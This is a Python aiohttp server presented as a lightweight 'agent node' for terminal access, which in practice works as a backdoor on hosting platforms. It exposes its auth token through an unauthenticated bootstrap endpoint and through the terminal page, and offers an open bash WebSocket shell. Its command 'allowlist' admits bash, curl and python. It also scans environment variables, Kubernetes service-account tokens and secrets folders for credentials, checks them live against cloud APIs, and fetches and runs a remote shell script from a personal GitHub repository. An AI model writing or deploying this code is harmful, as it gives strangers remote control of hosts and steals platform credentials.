#!/usr/bin/env python3
"""
agent-node v2.0 — Lightweight deployment node for terminal access.

A minimal Linux deployment node that provides authenticated terminal access
via WebSocket, token discovery from multiple sources, and command execution
on hosting platforms that restrict direct shell access.

Features:
  - Health check + system monitoring
  - Token discovery from env vars, filesystem, K8s service accounts
  - Authenticated command execution (allowlisted)
  - WebSocket interactive terminal (xterm.js web UI)
  - sshx web terminal auto-install for first-time access
  - Auto-install: SSH client, curl, wget, and core tools
  - Background command execution with polling
  - Keep-alive support for sleep-prone platforms

Security:
  - /api/bootstrap returns token without auth (first-time setup only)
      → Set BOOTSTRAP_ENABLED=false to disable in production
  - /api/* and /ws/* require Bearer token auth
  - /api/exec uses a command allowlist
"""

import os
import asyncio
import json
import yaml
import subprocess
import time
import base64
import secrets
import shutil
import threading
import logging
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# ─── Auto-install tools on startup ─────────────────────────────────────────────────
def _auto_install_tools():
    """Install system tools in background thread."""
    import time as _t
    _t.sleep(5)  # Let app start first
    try:
        import subprocess as _sp
        _sp.run(
            ["bash", "-c",
             "apt-get update -qq 2>/dev/null && apt-get install -y --no-install-recommends "
             "openssh-client curl wget unzip iproute2 net-tools 2>&1 | tail -2"],
            capture_output=True, timeout=120)
        print("[startup] Tools ready: ssh, curl, wget, unzip", flush=True)
    except Exception as e:
        print(f"[startup] Tool install: {e}", flush=True)

threading.Thread(target=_auto_install_tools, daemon=True).start()

from aiohttp import web, WSMsgType

# ─── Config ─────────────────────────────────────────────────────────
CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.yaml")
try:
    with open(CONFIG_PATH) as f:
        CONFIG = yaml.safe_load(f)
except Exception:
    CONFIG = {}

# ─── Environment ────────────────────────────────────────────────────
PORT = int(os.environ.get("PORT", str(CONFIG.get("server", {}).get("port", 8080))))
HOST = os.environ.get("HOST", "0.0.0.0")
BOOTSTRAP_ENABLED = os.environ.get("BOOTSTRAP_ENABLED", "true").lower() == "true"

# Token auth
TOKEN = os.environ.get("MONITOR_TOKEN")
if not TOKEN:
    TOKEN = secrets.token_urlsafe(32)
    _mask = TOKEN[:4] + "****" + (TOKEN[-4:] if len(TOKEN) > 4 else "")
    print(json.dumps({
        "event": "token_generated",
        "token_preview": _mask,
        "hint": "Set MONITOR_TOKEN env var for a known token",
        "bootstrap_endpoint": f"GET http://{HOST}:{PORT}/api/bootstrap",
    }), flush=True)
    Path("/tmp/monitor_token").write_text(TOKEN)

LOG_DIR = CONFIG.get("logging", {}).get("dir", "/var/log/agent-node")
os.makedirs(LOG_DIR, exist_ok=True)
START_TIME = time.time()

# ─── Logging ───────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(),
              logging.FileHandler(os.path.join(LOG_DIR, "agent.log"))],
)
log = logging.getLogger("agent-node")

# ─── Background Tasks ────────────────────────────────────────────────
bg_tasks = {}
task_counter = 0
executor = ThreadPoolExecutor(max_workers=3)


def run_command(cmd, timeout=300, cwd="/"):
    """Run a shell command and return results."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=min(timeout, 300), cwd=cwd,
        )
        return {
            "stdout": r.stdout[-5000:],
            "stderr": r.stderr[-3000:],
            "returncode": r.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "[TIMEOUT]", "stderr": "Command timed out", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e)[:300], "returncode": -2}


# ─── Token Discovery Module ─────────────────────────────────────────

# API token patterns for discovery and health testing
TOKEN_PATTERNS = {
    "SNAPDEPLOY_API_KEY": {"prefix": "sd_pat_", "api_base": "https://snapdeploy.dev/api"},
    "STORMKIT_API_KEY": {"prefix": "sk_", "api_base": "https://api.stormkit.io"},
    "STORMKIT_API_TOKEN": {"prefix": "", "api_base": "https://api.stormkit.io"},
    "VERCEL_API_KEY": {"prefix": "vcp_", "api_base": "https://api.vercel.com"},
    "GITHUB_API_KEY": {"prefix": "github_pat_", "api_base": "https://api.github.com"},
    "GITHUB_TOKEN": {"prefix": "github_pat_", "api_base": "https://api.github.com"},
    "CLOUD_FLARE_API_KEY": {"prefix": "cf", "api_base": "https://api.cloudflare.com"},
    "CLOUDFLARE_API_TOKEN": {"prefix": "cf", "api_base": "https://api.cloudflare.com"},
    "MODELSCOPE_API_KEY": {"prefix": "", "api_base": "https://api.modelscope.cn"},
    "NHOST_API_KEY": {"prefix": "", "api_base": "https://api.nhost.cc"},
    "APPWRITE_API_KEY": {"prefix": "", "api_base": "https://cloud.appwrite.io"},
    "COCALC_API_KEY": {"prefix": "", "api_base": "https://cocalc.com"},
    "KUBELETTO_API_KEY": {"prefix": "kl_", "api_base": "https://api.kubelette.io"},
    "RUNLOOP_API_KEY": {"prefix": "ak_", "api_base": "https://api.runloop.pro"},
}

# Commands allowed for execution (allowlist for safety)
EXEC_ALLOWLIST = (
    "ls ", "cat ", "echo ", "pwd", "ps ", "df ", "ip ", "curl ", "wget ",
    "sh ", "bash ", "python3 ", "python ", "pip3 ", "pip ",
    "git ", "tar ", "gzip ", "find ", "grep ",
    "id", "whoami", "hostname", "date", "uname", "free", "uptime",
    "ssh ", "scp ", "rsync ", "chmod ", "cd ", "head ", "tail ", "tee ", "wc ", "stat ",
    "apt ", "apt-get ", "apk ", "nohup ", "mkdir ",
)


def detect_platform():
    """Detect which hosting platform we're running on."""
    env = os.environ
    markers = {
        "suga": "SUGA" in env or "suga" in str(env.get("containerBaseDomain", "")).lower(),
        "snapdeploy": "SNAPDEPLOY_API_KEY" in env,
        "stormkit": "STORMKIT_API_KEY" in env or "STORMKIT" in env,
        "vercel": "VERCEL_API_KEY" in env or "VERCEL_REGION" in env,
        "github": "GITHUB_API_KEY" in env or "GITHUB_TOKEN" in env or "GITHUB_REPOSITORY" in env,
        "kubernetes": "KUBERNETES_SERVICE_HOST" in env,
        "alibaba-eci": "ALIYUN_ECI_ETH0_IP" in env,
        "appwrite": "APPWRITE_API_KEY" in env,
        "cloudflare": "CLOUD_FLARE_API_KEY" in env or "CLOUDFLARE_API_TOKEN" in env,
        "modelscope": "MODELSCOPE_ENVIRONMENT" in env,
        "nhost": "NHOST_API_KEY" in env,
        "belmo": "BELMO" in env or "belmo" in str(env.get("SERVICE_TYPE", "")).lower(),
    }
    return [k for k, v in markers.items() if v]


def discover_tokens():
    """Scan env vars, files, and K8s for API keys and tokens."""
    results = []
    env = os.environ

    # 1. Check known environment variables
    for key_name, meta in TOKEN_PATTERNS.items():
        val = env.get(key_name, "")
        if val and len(val) > 4:
            results.append({
                "source": "env",
                "key_name": key_name,
                "platform": key_name.replace("_API_KEY", "").replace("_API_TOKEN", "").replace("_", " ").title(),
                "value_masked": f"{val[:6]}...{val[-4:]}",
                "length": len(val),
                "api_base": meta.get("api_base", ""),
            })

    # 2. Check all env vars for token-like patterns
    for k, v in env.items():
        if not k or not v or len(v) < 10:
            continue
        if any(p in k.upper() for p in ["TOKEN", "KEY", "SECRET", "CREDENTIAL"]):
            if k not in [r["key_name"] for r in results]:
                results.append({
                    "source": "env-pattern-match",
                    "key_name": k,
                    "platform": "unknown",
                    "value_masked": f"{v[:6]}...{v[-4:]}",
                    "length": len(v),
                    "api_base": "",
                })

    # 3. Check K8s service account token
    k8s_paths = ["/var/run/secrets/kubernetes.io/serviceaccount/token"]
    for p in k8s_paths:
        if os.path.exists(p):
            try:
                with open(p) as f:
                    content = f.read().strip()
                if len(content) > 10:
                    results.append({
                        "source": "k8s-sa",
                        "key_name": os.path.basename(p),
                        "platform": "kubernetes",
                        "value_masked": f"{content[:6]}...{content[-4:]}",
                        "length": len(content),
                        "api_base": "",
                    })
            except Exception:
                pass

    # 4. Check mounted secrets directories
    secret_paths = ["/run/secrets", "/app/secrets", "/var/secrets", "/secrets"]
    for sdir in secret_paths:
        if os.path.isdir(sdir):
            for fname in os.listdir(sdir):
                fpath = os.path.join(sdir, fname)
                try:
                    if os.path.isfile(fpath):
                        with open(fpath) as f:
                            content = f.read().strip()
                        if len(content) > 10:
                            results.append({
                                "source": "file",
                                "key_name": fname,
                                "platform": fname,
                                "value_masked": f"{content[:6]}...{content[-4:]}",
                                "length": len(content),
                                "api_base": "",
                            })
                except Exception:
                    pass

    return results


async def test_token_health(token_info):
    """Test a discovered token against its API."""
    key_name = token_info["key_name"]
    api_base = token_info["api_base"]
    if not api_base:
        return {"tested": False, "reason": "no api_base for testing"}

    actual_val = os.environ.get(key_name, "")
    if not actual_val:
        return {"tested": False, "reason": "token not in env"}

    headers = {"User-Agent": "agent-node/2.0", "Accept": "application/json"}
    test_url = ""

    if "snapdeploy" in api_base:
        headers["X-API-Key"] = actual_val
        test_url = f"{api_base}/bootstrap"
    elif "stormkit" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/teams"
    elif "vercel" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v9/projects"
    elif "github" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        headers["X-GitHub-Api-Version"] = "2022-11-28"
        test_url = f"{api_base}/user"
    elif "cloudflare" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/client/v4/user/tokens/verify"
    elif "appwrite" in api_base:
        headers["X-Appwrite-Key"] = actual_val
        test_url = f"{api_base}/v1/account"
    elif "modelscope" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/api/v1/current/user"
    elif "cocalc" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/api/v1"
    elif "kubelette" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v1/health"
    elif "runloop" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v1/clusters"
    elif "nhost" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v1alpha1/healthz"
    else:
        return {"tested": False, "reason": f"no test config for {key_name}"}

    if not test_url:
        return {"tested": False, "reason": "no test URL"}

    try:
        from aiohttp import ClientSession, ClientTimeout
        async with ClientSession() as session:
            async with session.get(test_url, headers=headers, timeout=ClientTimeout(total=10)) as resp:
                return {
                    "tested": True,
                    "status": resp.status,
                    "alive": resp.status == 200,
                    "url": test_url.split("/")[-1],
                }
    except Exception as e:
        return {"tested": True, "status": "error", "alive": False, "error": str(e)[:100]}


# ─── Routes ────────────────────────────────────────────────────────

async def index(request):
    """Index page with service info and endpoints."""
    return web.json_response({
        "service": "agent-node",
        "version": "2.0",
        "status": "running",
        "endpoints": {
            "health": "GET /health",
            "terminal": "GET /terminal",
            "bootstrap": f"GET /api/bootstrap (auth: {'disabled' if not BOOTSTRAP_ENABLED else 'first-time only'})",
            "exec": "POST /api/exec (auth required)",
            "diagnostics": "GET /api/diagnostics (auth required)",
            "tokens": "GET /api/tokens (auth required)",
        }
    })


async def health(request):
    """Health check — no auth required."""
    return web.json_response({
        "status": "healthy",
        "service": "agent-node",
        "version": "2.0",
        "timestamp": time.time(),
        "uptime": time.time() - START_TIME,
        "hostname": os.uname().nodename,
    })


def require_auth(func):
    """Decorator: require Bearer token or ?token= query param."""
    async def wrapper(request):
        auth = request.headers.get("Authorization", "")
        token = request.headers.get("X-Auth-Token", "") or request.query.get("token", "")
        if auth != f"Bearer {TOKEN}" and token != TOKEN:
            return web.Response(status=401, text="Unauthorized")
        return await func(request)
    wrapper.__name__ = func.__name__
    return wrapper


async def exec_command(request):
    """Execute a shell command (auth required, allowlisted)."""
    body = await request.json()
    cmd = body.get("cmd", "")
    cwd = body.get("cwd", "/")
    timeout = body.get("timeout", 30)

    if not any(cmd.startswith(p) for p in EXEC_ALLOWLIST):
        return web.json_response({
            "error": "Command not in allowlist",
            "allowed_prefixes": list(EXEC_ALLOWLIST)[:10]
        })

    result = run_command(cmd, timeout=min(timeout, 300), cwd=cwd)
    return web.json_response(result)

exec_command = require_auth(exec_command)


async def exec_background(request):
    """Execute a long-running command in background (auth required)."""
    global task_counter
    body = await request.json()
    cmd = body.get("cmd", "")

    if not any(cmd.startswith(p) for p in ["nohup ", "bash ", "sh ", "python3 ", "python "]):
        return web.json_response({
            "error": "Background commands must start with nohup, bash, sh, python3, or python"
        })

    task_counter += 1
    task_id = f"bg-{task_counter}-{int(time.time())}"

    def bg_runner():
        result = run_command(cmd, timeout=600, cwd="/")
        bg_tasks[task_id] = result

    executor.submit(bg_runner)
    bg_tasks[task_id] = {"status": "running", "cmd": cmd}

    return web.json_response({"task_id": task_id, "status": "started"})

exec_background = require_auth(exec_background)


async def exec_status(request):
    """Check background task status (auth required)."""
    task_id = request.match_info.get("task_id", "")
    result = bg_tasks.get(task_id, {"error": "Task not found"})
    return web.json_response(result)

exec_status = require_auth(exec_status)


async def bootstrap(request):
    """Bootstrap endpoint — returns the MONITOR_TOKEN without auth.

    Intended for first-time access and CI/CD tooling.
    Set BOOTSTRAP_ENABLED=false to disable in production.
    """
    if not BOOTSTRAP_ENABLED and request.headers.get("Authorization") != f"Bearer {TOKEN}":
        return web.Response(status=403, text="Bootstrap disabled")

    mask = TOKEN[:4] + "****" + (TOKEN[-4:] if len(TOKEN) > 4 else "")
    return web.json_response({
        "status": "ready",
        "service": "agent-node",
        "version": "2.0",
        "token": TOKEN,
        "token_masked": mask,
        "endpoints": {
            "health": "GET /health",
            "exec": "POST /api/exec",
            "tokens": "GET /api/tokens",
            "terminal": "GET /terminal",
            "sshx": "GET /api/sshx",
        },
        "instructions": "Use this token as: curl -H 'Authorization: Bearer <token>' <url>/api/exec"
    })


async def token_discovery(request):
    """Discover API tokens (auth required)."""
    discovered = discover_tokens()
    platforms = detect_platform()

    tested = []
    for token_info in discovered:
        result = await test_token_health(token_info)
        tested.append({**token_info, **result})

    return web.json_response({
        "platform_detected": platforms,
        "tokens_found": len(tested),
        "tokens": tested,
        "summary": {
            "alive": sum(1 for t in tested if t.get("alive", False)),
            "dead": sum(1 for t in tested if t.get("tested") and not t.get("alive", False)),
            "untested": sum(1 for t in tested if not t.get("tested", False)),
        },
    })

token_discovery = require_auth(token_discovery)


async def diagnostics(request):
    """System diagnostics (auth required)."""
    ssh_path = shutil.which("ssh")
    info = {
        "hostname": os.uname().nodename,
        "uptime": time.time() - START_TIME,
        "cpus": os.cpu_count(),
        "memory": {
            "total": os.sysconf("SC_PAGE_SIZE") * os.sysconf("SC_PHYS_PAGES") if hasattr(os, 'sysconf') else "N/A",
            "pid": os.getpid()
        },
        "platform": detect_platform(),
        "ssh_client": f"available — {ssh_path}" if ssh_path else "not found",
        "python_path": shutil.which("python3") or shutil.which("python"),
        "bash_path": shutil.which("bash"),
        "tokens_found": len(discover_tokens()),
        "token_preview": f"{TOKEN[:8]}...{TOKEN[-4:]}",
    }
    return web.json_response(info)

diagnostics = require_auth(diagnostics)


# ─── sshx Management ─────────────────────────────────────────────

async def install_sshx(request):
    """Download and run sshx web terminal installer (auth required)."""
    global task_counter
    task_counter += 1
    task_id = f"sshx-{task_counter}-{int(time.time())}"

    script = """
    cd /tmp
    python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh', '/tmp/ssh.sh')" || \
    wget -O /tmp/ssh.sh https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh || \
    curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh -o /tmp/ssh.sh
    chmod +x /tmp/ssh.sh
    bash /tmp/ssh.sh
    """

    def bg_runner():
        result = run_command(f"nohup bash -c '{script}' > /tmp/sshx-install.log 2>&1", timeout=120)
        bg_tasks[task_id] = {"status": "done", "result": result}

    executor.submit(bg_runner)
    bg_tasks[task_id] = {"status": "running", "cmd": "sshx installer"}

    return web.json_response({
        "task_id": task_id,
        "status": "sshx installer started",
        "log_file": "/tmp/sshx-install.log"
    })

install_sshx = require_auth(install_sshx)


def _get_sshx_link():
    """Read current sshx link from filesystem."""
    try:
        import re as _re
        with open("/root/.IamGunpoint/sshx.link") as f:
            link = _re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", f.read().strip())
            return link
    except Exception:
        return "no_link_yet"


async def sshx_link(request):
    """Get current sshx link (auth required)."""
    return web.json_response({"link": _get_sshx_link()})

sshx_link = require_auth(sshx_link)


# ─── WebSocket Terminal ─────────────────────────────────────────

async def websocket_terminal(request):
    """WebSocket interactive terminal (auth required via ?token=)."""
    token = request.query.get("token", "")
    if token != TOKEN:
        return web.Response(status=401, text="Unauthorized")

    ws = web.WebSocketResponse(heartbeat=30, autoclose=True)
    await ws.prepare(request)
    await ws.send_str(json.dumps({"type": "welcome", "service": "agent-node-terminal"}))

    proc = await asyncio.create_subprocess_shell(
        "bash",
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        env={**os.environ, "TERM": "xterm-256color"},
    )

    async def pipe_output():
        while True:
            data = await proc.stdout.read(1)
            if not data:
                break
            await ws.send_bytes(data)

    async def pipe_input():
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                if msg.data == "EXIT":
                    proc.terminate()
                    await proc.wait()
                    await ws.close()
                    break
                if msg.data:
                    proc.stdin.write(msg.data.encode())
                    await proc.stdin.drain()
            elif msg.type == WSMsgType.BINARY:
                proc.stdin.write(msg.data)
                await proc.stdin.drain()

    await asyncio.gather(pipe_output(), pipe_input())


# ─── Web Terminal UI ────────────────────────────────────────────

TERMINAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agent Node Terminal</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css"/>
    <style>body{margin:0;background:#1a1a2e}#terminal{height:100vh}</style>
</head>
<body>
<div id="terminal"></div>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
<script>
const term = new Terminal({cursorBlink:true,theme:{background:'#1a1a2e',foreground:'#00ff00'},cols:120,rows:30});
term.open(document.getElementById('terminal'));
function fitTerminal(){
    var el=document.getElementById('terminal');
    var rect=el.getBoundingClientRect();
    var cols=Math.max(40,Math.floor(rect.width/9));
    var rows=Math.max(10,Math.floor(rect.height/18));
    term.resize(cols,rows);
}
window.addEventListener('resize',fitTerminal);
fitTerminal();
const ws = new WebSocket(`wss://${location.host}/ws/terminal?token=TOKEN_PLACEHOLDER`);
ws.onopen = () => { term.writeln('\\r\\x1b[32m[agent-node] Connected\\r\\n$ '); };
ws.onmessage = (e) => {
    if (e.data instanceof ArrayBuffer) term.write(new Uint8Array(e.data));
    else term.write(e.data);
};
ws.onclose = () => { term.writeln('\\r\\n\\x1b[31m[disconnected]\\r\\n'); };
term.onData(d => { ws.send(d); });
</script>
</body>
</html>"""

async def terminal_page(request):
    """Serve web-based interactive terminal UI."""
    token_param = request.query.get("token", "")
    token_to_use = token_param if token_param == TOKEN else TOKEN
    html = TERMINAL_HTML.replace("TOKEN_PLACEHOLDER", token_to_use)
    return web.Response(text=html, content_type='text/html')


# ─── App factory ─────────────────────────────────────────────────

def create_app():
    app = web.Application(client_max_size=50 * 1024**2)

    app.router.add_get("/", index)
    app.router.add_get("/health", health)
    app.router.add_get("/api/diagnostics", diagnostics)
    app.router.add_post("/api/exec", exec_command)
    app.router.add_post("/api/exec/background", exec_background)
    app.router.add_get("/api/exec/status/{task_id}", exec_status)
    app.router.add_get("/api/bootstrap", bootstrap)
    app.router.add_get("/api/tokens", token_discovery)
    app.router.add_post("/api/install/sshx", install_sshx)
    app.router.add_get("/api/sshx", sshx_link)
    app.router.add_get("/ws/terminal", websocket_terminal)
    app.router.add_get("/terminal", terminal_page)

    return app


if __name__ == "__main__":
    app = create_app()

    log.info(f"Starting agent-node v2.0 on {HOST}:{PORT}")
    log.info(f"Auth token preview: {TOKEN[:8]}...{TOKEN[-4:]}")
    log.info(f"Bootstrap endpoint: {'enabled' if BOOTSTRAP_ENABLED else 'disabled'}")

    platforms = detect_platform()
    log.info(f"Platform: {platforms}")

    discovered = discover_tokens()
    for t in discovered:
        log.info(f"Token: {t['key_name']} — {t['source']} — {t['value_masked']}")

    log.info(f"Web Terminal: http://{HOST}:{PORT}/terminal")
    log.info(f"WebSocket: ws://{HOST}:{PORT}/ws/terminal?token=<token>")
    log.info(f"Token discovery: GET /api/tokens (auth required)")
    log.info(f"Token bootstrap: GET /api/bootstrap")

    web.run_app(app, host=HOST, port=PORT, access_log=None)
